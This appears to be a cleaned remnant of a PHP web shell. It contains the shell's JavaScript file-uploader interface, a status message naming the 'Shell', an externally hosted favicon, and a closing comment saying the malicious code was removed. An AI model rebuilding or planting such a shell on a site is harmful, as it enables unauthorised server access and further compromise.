<script>
function upload(fileInputId, fileIndex)
    {
		var url = window.location.pathname;
		var scriptname = url.substring(url.lastIndexOf('/')+1);
		var filename = document.getElementById('upload_files').value;
		var filename = filename.match(/[^\\/]*$/)[0];
		var location = window.location.href;
		var directoryPath = location.substring(0, location.lastIndexOf("/")+1);
		document.getElementById("status").textContent = "Uploading the file "+filename+", please wait..";
		document.getElementById("status").style.color = "blue";
        // take the file from the input
        var file = document.getElementById(fileInputId).files[fileIndex];
        var reader = new FileReader();
        reader.readAsBinaryString(file); // alternatively you can use readAsDataURL
        reader.onloadend  = function(evt)
        {
                // create XHR instance
                xhr = new XMLHttpRequest();

                // send the file through POST
                xhr.open("POST", scriptname+"?name="+filename, true);

                // make sure we have the sendAsBinary method on all browsers
                XMLHttpRequest.prototype.mySendAsBinary = function(text){
                    var data = new ArrayBuffer(text.length);
                    var ui8a = new Uint8Array(data, 0);
                    for (var i = 0; i < text.length; i++) ui8a[i] = (text.charCodeAt(i) & 0xff);

                    if(typeof window.Blob == "function")
                    {
                         var blob = new Blob([data]);
                    }else{
                         var bb = new (window.MozBlobBuilder || window.WebKitBlobBuilder || window.BlobBuilder)();
                         bb.append(data);
                         var blob = bb.getBlob();
                    }

                    this.send(blob);
                }

                // let's track upload progress
                var eventSource = xhr.upload || xhr;
                eventSource.addEventListener("progress", function(e) {
                    // get percentage of how much of the current file has been sent
                    var position = e.position || e.loaded;
                    var total = e.totalSize || e.total;
                    var percentage = Math.round((position/total)*100);

                    // here you should write your own code how you wish to proces this
                });

                // state change observer - we need to know when and if the file was successfully uploaded
                xhr.onreadystatechange = function()
                {
                    if(xhr.readyState == 4)
                    {
                        if(xhr.status == 200)
                        {
                            // process success
							document.getElementById("status").textContent = "The file "+filename+" Uploaded successfully in same folder as Shell. At Link= "+directoryPath+filename;
							document.getElementById("status").style.color = "green";
                        }else{
                            // process error
                        }
                    }
                };

                // start sending
                xhr.mySendAsBinary(evt.target.result);
        };
    }
</script>

<html><link rel='icon' href='https://e.top4top.io/p_26973oc9i1.png' sizes='20x20' type='image/png'><?php 
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/
?>